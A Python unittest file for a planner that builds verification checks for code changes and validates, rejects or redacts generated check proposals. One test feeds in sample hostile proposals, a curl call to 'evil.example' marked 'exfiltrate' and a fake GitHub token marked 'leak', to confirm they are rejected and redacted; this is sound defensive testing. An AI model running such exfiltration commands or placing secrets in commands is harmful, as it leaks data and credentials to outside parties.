"""Planner behaviour: automatic derivation from trusted task inputs."""

from __future__ import annotations

import json

import support
from support import MiniSchemaValidator, OrchestratorCase, checks_of_class, load_schema


class PlannerTest(OrchestratorCase):
    def test_mandatory_checks_included_automatically(self):
        fixture = self.fixture()
        _, plan = self.build_plan(fixture)
        mandatory = checks_of_class(plan, "MANDATORY")
        self.assertEqual(2, len(mandatory))
        self.assertEqual(
            ["python3", "-m", "unittest", "discover", "-s", "tools/sample/tests", "-p", "test_*.py"],
            mandatory[0]["command"],
        )
        self.assertEqual(
            ["python3", "-m", "json.tool", "docs/governance/schemas/sample.schema.json"],
            mandatory[1]["command"],
        )
        self.assertTrue(mandatory[1]["discard_stdout"])
        for check in mandatory:
            self.assertEqual("issue-contract", check["origin"])
            self.assertEqual(fixture.head_sha, check["head_sha"])

    def test_regression_discovery_finds_committed_suites(self):
        fixture = self.fixture()
        _, plan = self.build_plan(fixture)
        regression = checks_of_class(plan, "REGRESSION")
        suites = {check["command"][5] for check in regression}
        self.assertEqual({"tools/sample/tests"}, suites)
        self.assertEqual({"regression-discovery"}, {check["origin"] for check in regression})

    def test_static_checks_cover_schemas_and_changed_python(self):
        fixture = self.fixture()
        _, plan = self.build_plan(fixture)
        static = checks_of_class(plan, "STATIC")
        json_targets = {check["command"][3] for check in static if check["command"][2] == "json.tool"}
        self.assertEqual({"docs/governance/schemas/sample.schema.json"}, json_targets)
        compile_checks = [check for check in static if check["command"][2] == "py_compile"]
        self.assertEqual(1, len(compile_checks))
        self.assertIn("tools/sample/newfile.py", compile_checks[0]["command"])

    def test_adversarial_checks_guard_forbidden_patterns(self):
        fixture = self.fixture()
        _, plan = self.build_plan(fixture)
        adversarial = checks_of_class(plan, "ADVERSARIAL")
        pathspecs = {check["command"][-1] for check in adversarial if "--quiet" in check["command"]}
        self.assertEqual({":(glob).github/**", ":(glob)vendor/**"}, pathspecs)
        self.assertTrue(any("--check" in check["command"] for check in adversarial))

    def test_rollback_checks_bind_base_and_head(self):
        fixture = self.fixture()
        _, plan = self.build_plan(fixture)
        rollback = checks_of_class(plan, "ROLLBACK")
        self.assertEqual(2, len(rollback))
        ancestor = [check for check in rollback if "--is-ancestor" in check["command"]]
        self.assertEqual(1, len(ancestor))
        self.assertIn(fixture.base_sha, ancestor[0]["command"])
        self.assertIn(fixture.head_sha, ancestor[0]["command"])

    def test_plan_is_canonical_deterministic_and_schema_valid(self):
        fixture = self.fixture()
        plan_path, plan = self.build_plan(fixture)
        first_bytes = plan_path.read_bytes()
        self.assertEqual(support.model.canonical_json_bytes(plan), first_bytes)

        second_path = self.workdir / "plan-2.json"
        code, stderr = self.invoke(fixture.plan_args(second_path))
        self.assertEqual(0, code, stderr)
        self.assertEqual(first_bytes, second_path.read_bytes())

        MiniSchemaValidator(load_schema(support.PLAN_SCHEMA)).validate(plan)
        identifiers = [check["id"] for check in plan["checks"]]
        self.assertEqual(len(identifiers), len(set(identifiers)))
        self.assertEqual(fixture.head_sha, plan["head_sha"])
        self.assertEqual(fixture.base_sha, plan["base_sha"])
        self.assertEqual(
            support.sha256_hex(fixture.issue_body.read_bytes()), plan["issue_body_sha256"]
        )
        self.assertEqual(
            support.sha256_hex(fixture.scope_report_path.read_bytes()), plan["scope_report_sha256"]
        )

    def test_generated_proposals_are_validated_individually(self):
        fixture = self.fixture()
        proposals = [
            {"purpose": "compile the new module in isolation",
             "command": ["python3", "-m", "py_compile", "tools/sample/newfile.py"]},
            {"purpose": "exfiltrate", "command": ["curl", "https://evil.example"]},
            {"purpose": "leak", "command": ["ghp_" + "a" * 24]},
            {"purpose": "shape", "command": ["python3", "-m", "py_compile", "x.py"], "extra": 1},
            {"purpose": "resources", "command": ["python3", "-m", "py_compile", "x.py"],
             "timeout_seconds": 999999},
        ]
        _, plan = self.build_plan(fixture, proposals=proposals)
        generated = checks_of_class(plan, "GENERATED")
        self.assertEqual(1, len(generated))
        self.assertEqual("generated-proposal", generated[0]["origin"])
        self.assertEqual("archive", generated[0]["isolation"])
        rejected_indexes = {item["index"] for item in plan["rejected_proposals"]}
        self.assertEqual({1, 2, 3, 4}, rejected_indexes)
        reasons = json.dumps(plan["rejected_proposals"])
        self.assertNotIn("ghp_" + "a" * 24, reasons)
        self.assertIn("[REDACTED]", reasons)

    def test_base_drift_blocks_planning(self):
        fixture = self.fixture()
        output = self.workdir / "plan.json"
        args = fixture.plan_args(output)
        args[args.index("--base-sha") + 1] = fixture.head_sha
        code, stderr = self.invoke(args)
        self.assertEqual(3, code)
        self.assertIn("drift", stderr)
        self.assertFalse(output.exists())

    def test_plan_output_must_be_outside_repository(self):
        fixture = self.fixture()
        output = fixture.repo.root / "plan.json"
        code, stderr = self.invoke(fixture.plan_args(output))
        self.assertEqual(3, code)
        self.assertIn("outside", stderr)
        self.assertFalse(output.exists())

    def test_scope_report_bound_to_other_head_is_rejected(self):
        fixture = self.fixture()
        document = json.loads(fixture.scope_report_path.read_text(encoding="utf-8"))
        document["head_sha"] = fixture.base_sha
        fixture.scope_report_path.write_bytes(support.model.canonical_json_bytes(document))
        code, stderr = self.invoke(fixture.plan_args(self.workdir / "plan.json"))
        self.assertEqual(3, code)
        self.assertIn("different base/head", stderr)


if __name__ == "__main__":
    import unittest

    unittest.main()
